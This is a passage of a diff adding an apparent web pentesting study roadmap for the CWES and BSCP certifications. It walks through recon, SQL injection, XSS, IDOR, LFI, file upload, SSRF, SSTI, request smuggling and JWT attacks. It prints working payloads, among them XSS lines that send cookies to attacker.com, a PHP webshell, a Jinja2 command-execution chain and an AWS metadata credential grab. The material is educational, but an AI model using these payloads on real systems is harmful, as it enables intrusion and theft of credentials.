+results:
+dev-api.target.com        ← development API, often no auth
+staging.target.com        ← staging env, often outdated and vulnerable
+internal-admin.target.com ← internal tool accidentally accessible
+jenkins.target.com        ← CI/CD server, often default credentials
+old.target.com            ← legacy app, unmaintained, CVEs unpatched
+
+the staging and internal subdomains are your priority targets.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-github">
+                        <button class="item-header" onclick="toggleItem('i-github')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">GitHub dorking — finding leaked credentials in public code</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                developers commit secrets constantly — API keys, database passwords, AWS credentials, private keys.
+                                GitHub's code search lets you find these in public repositories.
+                                tools like truffleHog and gitleaks scan entire repos (including commit history) for high-entropy strings that look like secrets.
+                            </div>
+                            <div class="code-label">// GitHub search operators for secrets</div>
+                            <div class="code-block">on github.com/search:
+
+"target.com" password filename:.env
+→ .env files mentioning the target domain
+
+org:targetcompany "api_key" language:python
+→ Python files with API keys in the target org's repos
+
+org:targetcompany "BEGIN RSA PRIVATE KEY"
+→ accidentally committed private SSH or TLS keys
+
+any of these found: immediate critical finding.
+AWS keys can mean full cloud infrastructure access.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s2-active">
+                <button class="section-header" onclick="toggleSection('s2-active')">
+                    <span class="section-title">active recon — direct enumeration</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        active recon sends requests to the target. this is your main enumeration workflow: finding every subdomain, every directory, every hidden endpoint.
+                        most tools are fast enough that this runs in the background while you manually browse the application.
+                    </div>
+                    <div class="item" id="i-subdomain">
+                        <button class="item-header" onclick="toggleItem('i-subdomain')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">subdomain enumeration — the real attack surface of any company</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                a company's main website is usually their most hardened target. their 47 subdomains often are not.
+                                DNS brute-forcing tries thousands of common subdomain names (dev, staging, api, admin, jenkins, etc.) and checks which ones resolve.
+                                tools: subfinder, amass, dnsx. pipe output through httpx to filter only live servers.
+                            </div>
+                            <div class="code-label">// subdomain recon pipeline</div>
+                            <div class="code-block">subfinder -d target.com | httpx -silent -status-code -title
+
+output:
+https://api.target.com [200] [API Gateway]
+https://dev.target.com [200] [Dev Environment]
+https://jenkins.target.com [200] [Jenkins CI]   ← try admin:admin
+https://admin.target.com [401] [Admin Portal]   ← try bypass techniques
+https://staging.target.com [403] [Forbidden]    ← try to bypass 403</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-ffuf">
+                        <button class="item-header" onclick="toggleItem('i-ffuf')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">directory and file fuzzing — finding the hidden surface</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                every web app has files and directories that aren't linked from the navigation.
+                                backup files, config files, admin panels, old API versions — fuzzing tries thousands of names from wordlists.
+                                SecLists (github.com/danielmiessler/SecLists) is the standard wordlist collection.
+                                ffuf is the fastest fuzzer. gobuster and feroxbuster are alternatives.
+                            </div>
+                            <div class="code-label">// ffuf directory fuzzing</div>
+                            <div class="code-block">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
+     -u https://target.com/FUZZ \
+     -fc 404
+
+real finds this produces:
+/config.php.bak     → download it → database credentials in plaintext
+/.git/              → git directory exposed → clone entire source code
+/backup.zip         → full application backup, passwords included
+/admin/             → admin panel, try default creds or bypass
+/api/v2/internal/   → undocumented internal API, no auth</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 3 — CORE VULNERABILITIES
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-3">
+        <button class="phase-header" onclick="togglePhase('phase-3')">
+            <span class="phase-num">phase 03</span>
+            <span class="phase-title">CORE VULNERABILITIES — OWASP Top 10 and beyond</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                this is the technical core of web pentesting. each vulnerability class has its own discovery techniques, exploitation methods, and bypass approaches.
+                the goal is to understand each one deeply enough that you recognize the conditions for it during manual testing — not just run a scanner and hope.
+                covering: SQL injection, XSS, access control, file attacks, command injection, SSTI, and more.
+            </div>
+
+            <div class="section-block" id="s3-sqli">
+                <button class="section-header" onclick="toggleSection('s3-sqli')">
+                    <span class="section-title">SQL injection</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        SQL injection is 30 years old and still one of the top findings in every pentest report.
+                        it occurs when user input is concatenated directly into a database query without sanitization.
+                        impact ranges from authentication bypass to full database dump to remote code execution.
+                    </div>
+                    <div class="item" id="i-sqli-basic">
+                        <button class="item-header" onclick="toggleItem('i-sqli-basic')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">how SQLi works — the core mental model</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the application constructs a SQL query by gluing your input directly into a string.
+                                when you add a single quote ('), you break the SQL syntax — causing an error that confirms your input reaches the database.
+                                from there you manipulate the query logic: bypass login, extract data, execute system commands.
+                            </div>
+                            <div class="code-label">// login bypass via SQL injection</div>
+                            <div class="code-block">-- app runs this query:
+SELECT * FROM users WHERE username='[your input]' AND password='[your input]'
+
+-- you enter as username: admin'--
+-- the query becomes:
+SELECT * FROM users WHERE username='admin'--' AND password='...'
+-- everything after -- is a SQL comment. password check never runs.
+-- you log in as admin with any password.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-sqli-union">
+                        <button class="item-header" onclick="toggleItem('i-sqli-union')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">UNION-based extraction — pulling data from the database</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                once SQLi is confirmed, UNION SELECT appends a second query and shows its results in the page response.
+                                you first find how many columns the original query returns (increment ORDER BY until error), then inject a matching UNION that extracts what you want.
+                            </div>
+                            <div class="code-label">// extracting all usernames and passwords</div>
+                            <div class="code-block">-- find column count:
+' ORDER BY 1--   ✓
+' ORDER BY 2--   ✓
+' ORDER BY 3--   ✗  → 2 columns
+
+-- list all tables:
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+-- dump users table:
+' UNION SELECT username,password FROM users--
+
+result: every account credential in the database.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-sqli-blind">
+                        <button class="item-header" onclick="toggleItem('i-sqli-blind')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">blind SQLi — when the app shows no output or errors</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                most modern apps don't display database errors or results directly.
+                                blind SQLi infers data through behavior differences.
+                                boolean-based: the page responds differently when your condition is true vs false.
+                                time-based: inject a SLEEP() and measure how long the server takes to respond.
+                                sqlmap automates all of this.
+                            </div>
+                            <div class="code-label">// boolean and time-based blind SQLi</div>
+                            <div class="code-block">-- boolean: is the first char of the admin password 'a'?
+' AND SUBSTRING(password,1,1)='a'--
+→ if page loads normally: yes. if different: no.
+→ repeat for each character until you have the full password.
+
+-- time-based: is this MySQL?
+' AND SLEEP(5)--
+→ if response takes 5 seconds: confirmed MySQL, SQLi exists
+
+-- sqlmap automates all of it:
+sqlmap -u "https://target.com/product?id=1" --dbs --level 3</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s3-xss">
+                <button class="section-header" onclick="toggleSection('s3-xss')">
+                    <span class="section-title">cross-site scripting (XSS)</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        XSS lets you inject JavaScript that executes in a victim's browser.
+                        the impact isn't just alert(1) — it's cookie theft, session hijacking, keylogging, CSRF actions performed as the victim, and full account takeover.
+                        CWES and BSCP both test XSS heavily because it appears constantly in real applications.
+                    </div>
+                    <div class="item" id="i-xss-types">
+                        <button class="item-header" onclick="toggleItem('i-xss-types')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">reflected vs stored vs DOM — three different attack scenarios</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                reflected XSS: your payload is in the URL, victim must click your crafted link. impact limited to users who click it.
+                                stored XSS: your payload is saved to the database and executes for every user who visits that page. highest impact — no user interaction per victim needed after initial injection.
+                                DOM XSS: the vulnerability lives entirely in client-side JavaScript. your payload never reaches the server. harder to detect with scanners.
+                            </div>
+                            <div class="code-label">// three types in practice</div>
+                            <div class="code-block">// reflected — payload in the URL, victim must click:
+https://target.com/search?q=<script>alert(document.cookie)</script>
+
+// stored — saved to DB, executes for all visitors:
+// posted in a comment field:
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+
+// DOM — JavaScript reads unsafe input and writes to page:
+// app code: document.getElementById('out').innerHTML = location.hash.slice(1)
+// attacker URL: https://target.com/page#<img src=x onerror=alert(1)></div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-xss-impact">
+                        <button class="item-header" onclick="toggleItem('i-xss-impact')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">XSS to account takeover — demonstrating real impact</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                in a pentest you need to show business impact, not just "XSS exists."
+                                if the session cookie isn't HttpOnly, you steal it and replay it to log in as the victim.
+                                if it is HttpOnly, you use the victim's active session to perform sensitive actions on their behalf — this is called XSS-to-CSRF.
+                            </div>
+                            <div class="code-label">// cookie theft → account takeover</div>
+                            <div class="code-block">// payload (stored in victim's browser context):
+<script>
+  var img = new Image();
+  img.src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
+</script>
+
+// attacker receives: session=eyJhbGci...
+// attacker sets that cookie in their browser
+// attacker is now logged in as victim — account takeover.
+
+// if HttpOnly (can't steal cookie) → use XSS to perform actions as victim:
+<script>
+  fetch('/account/change-email', {
+    method: 'POST',
+    body: 'email=attacker@evil.com',
+    credentials: 'include'
+  });
+</script></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s3-idor">
+                <button class="section-header" onclick="toggleSection('s3-idor')">
+                    <span class="section-title">access control & IDOR</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        broken access control is the #1 vulnerability in OWASP Top 10 (2021 and 2023).
+                        IDOR (Insecure Direct Object Reference) is the most common variant: the application uses a user-controllable value to access a resource without checking that the user owns it.
+                        trivial to find, often critical severity, extremely common in APIs.
+                    </div>
+                    <div class="item" id="i-idor">
+                        <button class="item-header" onclick="toggleItem('i-idor')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">IDOR — the simplest critical vulnerability</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                you access your own resource at /api/user/1337. you change 1337 to 1338. if you get another user's data — that's an IDOR.
+                                the server authenticated you (it knows you're logged in) but failed to check that the resource you're asking for belongs to you.
+                                authentication and authorization are two separate systems. both need to work.
+                            </div>
+                            <div class="code-label">// IDOR in an API endpoint</div>
+                            <div class="code-block">// your request:
+GET /api/orders/5001
+Cookie: session=your_token
+response: {"order_id":5001,"items":[...],"total":99.00,"user":"4ss3m"}
+
+// change ID to someone else's:
+GET /api/orders/5002
+Cookie: session=your_token  ← still your session
+response: {"order_id":5002,"items":[...],"total":249.00,"user":"victim"}
+
+// you read someone else's full order. IDOR.
+// scale with Burp Intruder across 1-10000 → every order in the database.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s3-file">
+                <button class="section-header" onclick="toggleSection('s3-file')">
+                    <span class="section-title">file & path attacks — LFI, file upload, path traversal</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        when user input controls file paths or file uploads, the attacker controls what the server reads or executes.
+                        path traversal → LFI → RCE is one of the most satisfying exploit chains in web hacking.
+                        file upload bypass is often the most direct route to a webshell on the server.
+                    </div>
+                    <div class="item" id="i-lfi">
+                        <button class="item-header" onclick="toggleItem('i-lfi')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">path traversal / LFI — reading files outside the intended directory</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                when an application uses user input in a file path without sanitizing ../, you can traverse the directory structure.
+                                target files: /etc/passwd (users list, confirms LFI), application config files (database credentials), SSH private keys (/root/.ssh/id_rsa), application source code.
+                                in PHP apps, the php://filter wrapper lets you read PHP source code as base64 rather than having it execute.
+                            </div>
+                            <div class="code-label">// LFI to credential theft</div>
+                            <div class="code-block">// normal: GET /view?file=report.pdf
+// traversal:
+GET /view?file=../../../../etc/passwd
+response: root:x:0:0:root:/root:/bin/bash
+          www-data:x:33:33:www-data:/var/www:/bin/sh
+// confirmed: reading system files
+
+// PHP wrapper — read application source code:
+GET /page?file=php://filter/convert.base64-encode/resource=config.php
+response: base64 string
+// decode it → config.php contains: $db_password = "Sup3rS3cr3t!"</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-upload">
+                        <button class="item-header" onclick="toggleItem('i-upload')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">file upload bypass — getting a webshell on the server</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                file upload vulnerabilities let you upload a file that executes server-side — giving you remote code execution.
+                                most apps try to allow only images. bypass techniques: change Content-Type header (the server trusts headers, not file content), use alternate extensions (.php5, .phtml, .phar), use double extensions (shell.php.jpg).
+                                a webshell is a tiny script that lets you run any command on the server.
+                            </div>
+                            <div class="code-label">// file upload to RCE</div>
+                            <div class="code-block">// malicious file: shell.php
+<?php system($_GET['cmd']); ?>
+
+// server only accepts .jpg → intercept upload in Burp, change:
+Content-Type: image/jpeg   ← was application/php
+filename: shell.php        ← keep the .php extension
+
+// server stores it at /uploads/shell.php
+// you access: https://target.com/uploads/shell.php?cmd=id
+// response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+// you have remote code execution on the server.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 4 — ADVANCED
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-4">
+        <button class="phase-header" onclick="togglePhase('phase-4')">
+            <span class="phase-num">phase 04</span>
+            <span class="phase-title">ADVANCED EXPLOITATION — SSRF, smuggling, SSTI, deserialization</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                this is where intermediate pentesters stop and where the real differentiation happens.
+                these vulnerabilities require deeper understanding of web infrastructure, protocol behavior, and application internals.
+                SSRF, HTTP request smuggling, SSTI, and deserialization all appear in BSCP exam and real high-value engagements.
+            </div>
+
+            <div class="section-block" id="s4-ssrf">
+                <button class="section-header" onclick="toggleSection('s4-ssrf')">
+                    <span class="section-title">SSRF — server-side request forgery</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        SSRF makes the server send requests on your behalf. the server has access to internal networks and cloud metadata that you don't.
+                        SSRF is your key to breaking into internal infrastructure through a public-facing web app.
+                        impact: internal network scanning, cloud credential theft, accessing internal admin panels.
+                    </div>
+                    <div class="item" id="i-ssrf">
+                        <button class="item-header" onclick="toggleItem('i-ssrf')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">SSRF — making the server reach internal addresses</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                applications that fetch remote URLs (webhook configs, URL preview features, PDF generators, image importers) can be abused.
+                                instead of providing a real URL, you provide an internal address. the server fetches it on your behalf and returns the response.
+                                you gain access to everything the server can reach — which is everything on its internal network.
+                            </div>
+                            <div class="code-label">// SSRF to cloud credential theft</div>
+                            <div class="code-block">// normal request:
+POST /api/generate-preview
+{"url": "https://example.com/image.jpg"}
+
+// SSRF — internal admin panel:
+{"url": "http://127.0.0.1:8080/admin"}
+response: admin panel HTML that's not publicly accessible
+
+// SSRF to AWS metadata (cloud environments):
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}
+response: {
+  "AccessKeyId": "ASIAXXX",
+  "SecretAccessKey": "abc123...",
+  "Token": "FQoGZXIvYXdz..."
+}
+// temporary AWS credentials → access to S3, EC2, IAM → full cloud takeover.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s4-ssti">
+                <button class="section-header" onclick="toggleSection('s4-ssti')">
+                    <span class="section-title">SSTI — server-side template injection</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        template engines let developers embed variables in HTML: {{user.name}}, ${item.price}.
+                        when user input reaches the template engine unfiltered, you can inject template expressions that execute on the server.
+                        SSTI often leads directly to remote code execution — the highest severity finding in web pentesting.
+                    </div>
+                    <div class="item" id="i-ssti">
+                        <button class="item-header" onclick="toggleItem('i-ssti')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">detecting and exploiting SSTI</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                detection: inject mathematical expressions in different syntaxes. if the page renders the result (49 instead of {{7*7}}), the template engine is processing your input.
+                                the syntax that works identifies the engine. each engine has different RCE payloads.
+                                Jinja2 (Python) is the most common and has well-documented RCE chains.
+                            </div>
+                            <div class="code-label">// SSTI detection and Jinja2 RCE</div>
+                            <div class="code-block">// inject into any user-controlled field that appears in the response:
+{{7*7}}   → if page shows "49" → Jinja2 or Twig (Python/PHP)
+${7*7}    → if page shows "49" → Freemarker or Mako (Java/Python)
+#{7*7}    → if page shows "49" → Ruby ERB
+
+// Jinja2 (Python) RCE — execute OS commands:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+// response: "uid=1000(www-data) gid=1000(www-data)"
+// you have remote code execution via a template injection.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s4-smuggling">
+                <button class="section-header" onclick="toggleSection('s4-smuggling')">
+                    <span class="section-title">HTTP request smuggling</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        when a front-end proxy and back-end server disagree on where one HTTP request ends and the next begins,
+                        you can "smuggle" malicious data that poisons other users' requests.
+                        rated critical because it can bypass WAFs, capture victims' credentials, and chain with other vulnerabilities.
+                    </div>
+                    <div class="item" id="i-smuggling">
+                        <button class="item-header" onclick="toggleItem('i-smuggling')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">CL.TE — content-length vs transfer-encoding desync</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the front-end uses Content-Length to parse the request boundary. the back-end uses Transfer-Encoding: chunked.
+                                you craft a request that both headers describe differently. the front-end forwards what it thinks is one complete request.
+                                the back-end processes part of it as request one, and queues the remainder as the start of the next request.
+                                the next legitimate user's request is prefixed by your smuggled data.
+                            </div>
+                            <div class="code-label">// CL.TE smuggling to steal victim cookies</div>
+                            <div class="code-block">// your crafted request:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 46
+Transfer-Encoding: chunked
+
+0
+
+POST /comment HTTP/1.1
+Content-Length: 200
+
+comment=
+
+// the next user's request (including their Cookie header) gets
+// appended to your "comment=" body.
+// you read /comment → their session cookie is in the comment text.
+// you replay their cookie → you are them. account takeover.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 5 — APIs
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-5">
+        <button class="phase-header" onclick="togglePhase('phase-5')">
+            <span class="phase-num">phase 05</span>
+            <span class="phase-title">APIs & MODERN STACKS — REST, JWT, GraphQL, OAuth</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                every modern application is an API. mobile apps, single-page applications, microservices — they all communicate via REST or GraphQL APIs.
+                API security has its own OWASP top 10 (separate from the web app top 10) because API vulnerabilities have distinct patterns.
+                this is the highest-growth area in web security and where the most bugs are being found in bug bounty programs right now.
+            </div>
+
+            <div class="section-block" id="s5-rest">
+                <button class="section-header" onclick="toggleSection('s5-rest')">
+                    <span class="section-title">REST APIs — structure, authentication, attack surface</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        REST APIs use HTTP verbs as actions and URLs as resources. they return JSON. they authenticate via tokens (JWT, API keys, Bearer).
+                        understanding REST means you can predict unexposed endpoints, test every method, and identify where access control is missing.
+                    </div>
+                    <div class="item" id="i-rest-idor">
+                        <button class="item-header" onclick="toggleItem('i-rest-idor')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">BOLA/IDOR — the most common critical API vulnerability</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                BOLA (Broken Object Level Authorization) is the API name for IDOR. it's consistently the #1 finding in API security assessments.
+                                every API endpoint that takes an object ID (user ID, order ID, document ID) is a potential BOLA.
+                                the question: if you change that ID to another user's ID, does the server check that you own it?
+                            </div>
+                            <div class="code-label">// BOLA across multiple endpoint types</div>
+                            <div class="code-block">GET /api/v1/users/1337/profile      → your profile
+GET /api/v1/users/1/profile         → admin's profile? BOLA
+
+GET /api/v1/messages/thread/5001    → your message thread
+GET /api/v1/messages/thread/1       → someone else's private messages? BOLA
+
+POST /api/v1/orders/9999/cancel     → cancel order 9999 (not yours)
+
+the pattern: any endpoint with an ID in the URL.
+test every one. change the ID. check if the server enforces ownership.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-mass-assign">
+                        <button class="item-header" onclick="toggleItem('i-mass-assign')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">mass assignment — sending fields the API never intended to accept</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                many frameworks automatically bind JSON request body fields to object properties.
+                                if a User object has an isAdmin property but the developer forgot to block it from being set via the API, you can send isAdmin: true and become an admin.
+                                this is mass assignment — the API accepts more fields than it should.
+                            </div>
+                            <div class="code-label">// mass assignment to privilege escalation</div>
+                            <div class="code-block">// normal registration request:
+POST /api/register
+{"username":"4ss3m","password":"pass123","email":"me@x.com"}
+
+// you add extra fields the developer didn't think to block:
+POST /api/register
+{"username":"4ss3m","password":"pass123","email":"me@x.com","isAdmin":true,"role":"admin","credits":99999}
+
+// if the backend blindly maps all JSON fields to the User object:
+// you just created an admin account with unlimited credits.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s5-jwt">
+                <button class="section-header" onclick="toggleSection('s5-jwt')">
+                    <span class="section-title">JWT attacks — forging authentication tokens</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        JSON Web Tokens are the standard API authentication mechanism. they're self-contained: the server doesn't store sessions — it just verifies the token's signature.
+                        JWT vulnerabilities arise when that signature verification is weak, skipped, or bypassable.
+                        JWT attacks appear in CWES, BSCP, and every serious API pentest.
+                    </div>
+                    <div class="item" id="i-jwt-none">
+                        <button class="item-header" onclick="toggleItem('i-jwt-none')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">alg:none — removing the signature entirely</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                a JWT has three parts: header (algorithm), payload (your user data), signature (cryptographic proof).
+                                the alg:none attack: change the algorithm to "none", modify the payload (role: user → role: admin), and remove the signature.
+                                some libraries, if not configured correctly, accept "none" as a valid algorithm — meaning no signature is required. your unsigned, self-modified token is accepted.
+                            </div>
+                            <div class="code-label">// JWT structure and alg:none attack</div>
+                            <div class="code-block">// original JWT (three base64 parts separated by dots):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9           ← header: {"alg":"HS256"}
+.eyJ1c2VySWQiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ   ← payload: {"userId":"1337","role":"user"}
+.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← signature
+
+// alg:none attack:
+// 1. decode header → change "alg":"HS256" to "alg":"none"
+// 2. decode payload → change "role":"user" to "role":"admin"
+// 3. re-encode both → drop the signature entirely
+// 4. send: header.payload.  (note the trailing dot — no signature)
+
+// if the server accepts it → you're now admin.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-jwt-confusion">
+                        <button class="item-header" onclick="toggleItem('i-jwt-confusion')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">RS256 → HS256 algorithm confusion — using the public key against itself</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                RS256 uses asymmetric cryptography: the server signs with a private key and verifies with its public key.
+                                HS256 uses symmetric cryptography: the same secret key is used to sign and verify.
+                                attack: take the server's public key (often available at /.well-known/jwks.json), tell the JWT to switch to HS256, sign your forged payload with the public key as the HS256 secret.
+                                if the server doesn't handle algorithm switching securely, it verifies with its own public key — which matches your signature. admin access.
+                            </div>
+                            <div class="code-label">// RS256 → HS256 confusion attack steps</div>
+                            <div class="code-block">step 1: find the server's public key
+  GET /.well-known/jwks.json → {"keys":[{"kty":"RSA","n":"...","e":"AQAB"}]}
+
+step 2: in Burp JWT Editor:
+  - change header "alg":"RS256" → "alg":"HS256"
+  - change payload "role":"user" → "role":"admin"
+  - sign with the server's public key as the HS256 secret
+
+step 3: send the forged token
+  if vulnerable → server verifies with its own public key
+  your signature matches → admin access granted</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s5-graphql">
+                <button class="section-header" onclick="toggleSection('s5-graphql')">
+                    <span class="section-title">GraphQL — querying the schema, finding authorization failures</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        GraphQL is replacing REST in modern stacks. instead of multiple endpoints, there's one endpoint that accepts structured queries.
+                        it has a built-in schema introspection feature that, when left enabled in production, gives you a complete map of everything the API can do.
+                        authorization is entirely the developer's responsibility — the framework provides none — making authorization failures extremely common.
+                    </div>
+                    <div class="item" id="i-graphql-intro">
+                        <button class="item-header" onclick="toggleItem('i-graphql-intro')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">introspection — querying the API to get its full documentation</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                introspection is a GraphQL feature where you query the API's own schema.
+                                when enabled in production (common misconfiguration), you receive the complete list of all types, queries, mutations, and their argument names — without any authentication.
+                                this is the equivalent of the server emailing you its full API documentation unprompted.
+                            </div>
+                            <div class="code-label">// introspection query</div>
+                            <div class="code-block">// send to: POST /graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name kind }
+        args { name type { name } }
+      }
+    }
+  }
+}
+
+// response reveals everything:
+// types: User, Order, Message, Admin
+// User fields: id, email, password, isAdmin, creditCardNumber
+// mutations: deleteUser, updateUserRole, transferFunds
+
+// you now know: what data exists, how to access it, what operations are possible.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 6 — CERTIFICATIONS
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-6">
+        <button class="phase-header" onclick="togglePhase('phase-6')">
+            <span class="phase-num">phase 06</span>
+            <span class="phase-title">CERTIFICATIONS — CWES & BSCP strategy</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                both certifications are fully hands-on — no multiple choice, no theory tests.
+                you attack real (intentionally vulnerable) web applications and demonstrate actual exploitation skill.
+                CWES comes first (7-day exam, report required). BSCP is faster and more intense (4 hours, two apps, six exploits).
+                both are industry-recognized and appear as hard filters in web security job postings.
+            </div>
+
+            <div class="section-block" id="s6-cwes">
+                <button class="section-header" onclick="toggleSection('s6-cwes')">
+                    <span class="section-title">CWES — HTB Certified Web Exploitation Specialist</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        issued by HackTheBox. requires completing the full Web Penetration Tester path (20 modules, 279 sections).
+                        7-day exam: multiple web applications, minimum 80% of flags to pass, professional pentest report required.
+                        the report is what fails most people — not the technical part.
+                    </div>
+                    <div class="item" id="i-cwes-exam">
+                        <button class="item-header" onclick="toggleItem('i-cwes-exam')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">exam format and what to expect</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                you're given VPN access to several web applications. you pentest them exactly as you would in a real engagement.
+                                each application has two flags: one for user-level access, one for server/admin-level access.
+                                the technical part is typically clearable in 48 hours. the remaining 5 days are for refining the report.
+                                the report must be client-grade: executive summary, findings with CVSS scores, reproduction steps, impact statements, and remediation advice.
+                            </div>
+                            <div class="code-label">// what a passing finding entry looks like</div>
+                            <div class="code-block">title:       SQL Injection in /login endpoint
+severity:    Critical
+cvss:        9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+
+description:
+  The login endpoint at /api/auth constructs SQL queries by concatenating
+  user-supplied input without using parameterized queries. An unauthenticated
+  attacker can inject SQL to bypass authentication controls entirely.
+
+proof of concept:
+  1. Navigate to https://target.com/login
+  2. Enter username: admin'--
+  3. Enter any password
+  4. Click Login — access granted as administrator
+
+impact:
+  Unauthenticated access to all user accounts and administrative functionality.
+  Full database contents accessible including customer PII.
+
+remediation:
+  Replace string concatenation with parameterized queries / prepared statements.
+  Reference: OWASP SQL Injection Prevention Cheat Sheet</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s6-bscp">
+                <button class="section-header" onclick="toggleSection('s6-bscp')">
+                    <span class="section-title">BSCP — Burp Suite Certified Practitioner</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
